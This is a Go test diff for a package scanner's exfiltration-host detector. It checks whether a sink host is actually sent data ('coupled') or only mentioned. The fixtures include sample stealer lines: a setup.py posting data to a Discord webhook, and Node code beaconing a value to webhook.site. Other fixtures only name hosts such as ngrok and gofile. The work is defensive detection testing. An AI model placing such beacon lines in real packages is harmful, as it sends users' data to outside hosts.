@@ -313,3 +313,43 @@ func TestScan_ShippingStealerWinsOverWeakStealer(t *testing.T) {
 		}
 	}
 }
+
+// TestExfilHostCoupled pins the field the risk engine reads. A sink the same
+// file sends to is coupled; a sink that is only named (yt-dlp's list of
+// unsupported sites, ngrok's type declarations) is not, and still reports as
+// exfil_host so the guard's behaviour is unchanged.
+func TestExfilHostCoupled(t *testing.T) {
+	cases := []struct {
+		name  string
+		files map[string][]byte
+		want  bool
+	}{
+		{"python stealer posts to webhook", map[string][]byte{
+			"pkg/setup.py": []byte("import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=d)\n"),
+		}, true},
+		{"node beacon to webhook", map[string][]byte{
+			"package/index.js": []byte("const https=require('https');\nhttps.get('https://webhook.site/abc?h='+h);\n"),
+		}, true},
+		{"site list names the host", map[string][]byte{
+			"yt_dlp/extractor/unsupported.py": []byte("_TESTS = [{'url': 'https://gofile.io/d/abc'}]\n"),
+		}, false},
+		{"type declaration names the host", map[string][]byte{
+			"package/index.d.ts": []byte("/** e.g. https://abc.ngrok.io */\nexport declare function connect(): string;\n"),
+		}, false},
+		{"coupled file wins over a named-only file", map[string][]byte{
+			"package/docs.js":  []byte("// see https://webhook.site/abc\n"),
+			"package/index.js": []byte("fetch('https://webhook.site/abc', {method:'POST'})\n"),
+		}, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			r := Scan(tc.files)
+			if !r.Detected || r.Kind != "exfil_host" || r.Weak {
+				t.Fatalf("got %+v, want a shipping exfil_host hit", r)
+			}
+			if r.Coupled != tc.want {
+				t.Fatalf("Coupled = %v, want %v (%s)", r.Coupled, tc.want, r.Detail)
+			}
+		})
+	}
+}
